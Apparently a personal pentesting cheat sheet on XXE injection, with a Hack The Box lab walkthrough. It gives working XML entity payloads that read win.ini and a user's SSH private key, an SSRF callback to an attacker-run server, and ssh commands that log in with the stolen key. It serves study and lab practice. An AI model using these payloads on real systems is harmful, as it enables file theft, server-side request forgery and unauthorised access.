# XXE Injection
https://portswigger.net/web-security/xxe

https://whitehats.pwr.edu.pl/research/xxe-injection/

https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html

https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md

## Examples
Legit POST request:
```
POST /process.php HTTP/1.1
Host: 10.129.95.192
[...]
Connection: keep-alive

<?xml version = "1.0"?>
<order><quantity>1</quantity><item>Home Appliances</item><address>adsadasads</address></order>
```
### LFI
Test LFI (IF we se the output on the HTTP Response)
HTTP Request
```
POST /process.php HTTP/1.1
Host: 10.129.95.192
[...]
Connection: keep-alive

<?xml version = "1.0"?>
<!DOCTYPE xxe [
    <!ENTITY lfi SYSTEM "file:///c:/windows/win.ini">
]>
<order><quantity>1</quantity><item>&lfi;</item><address>aaaa</address></order>
```
HTTP Response
```
Your order for ; for 16-bit app support
[fonts]
[...]
COM1:=9600,n,8,1
 has been processed
```

### SSRF
Test SSFR to confirm vulnerability
1. Run Python web server on Kali
```
python -m http.server 8081
```
2. Try to perform SSRF
```
POST /process.php HTTP/1.1
Host: 10.129.95.192
[...]
Connection: keep-alive

<?xml version = "1.0"?>
<!DOCTYPE xxe [
    <!ENTITY ssrf SYSTEM "http://<KALI IP>:8081">
]>
<order><quantity>1</quantity><item>Home Appliances</item><address>&ssrf;</address></order>
```
3. We see connection to Python webserver confirming the vuln!

### LFI via SSRF
Great when we want to see file (LFI) but web server does not return our data in HTTP response
https://whitehats.pwr.edu.pl/research/xxe-injection/#ssrf-and-lfi-via-xxe-injection


## HTB Exmaple
In HTB example the webserver was running windows and also had a n open SSH port.
From reading source code we could guess username 'daniel'
HTTP Request
```
POST /process.php HTTP/1.1
Host: 10.129.95.192
[...]
Connection: keep-alive

<?xml version = "1.0"?>
<!DOCTYPE xxe [
    <!ENTITY lfi SYSTEM "file:///c:/users/daniel/.ssh/id_rsa">
]>
<order><quantity>1</quantity><item>&lfi;</item><address>aaaa</address></order>
```
HTTP Response
```
Your order for -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
[...]
vRCD2pONhqZOjinGfGUMml1UaJZzxZs6F9hmOz+WAek89dPdD4rBCU2fS3J7bs9Xx2PdyA
m3MVFR4sN7a1cAAAANZGFuaWVsQEVudGl0eQECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
 has been processed
```
Now we can use it to log in via SSH.
```
# Use chmod so we don't need to supply password
chmod 400 id_rsa  
ssh -i id_rsa daniel@<webserver IP>
```
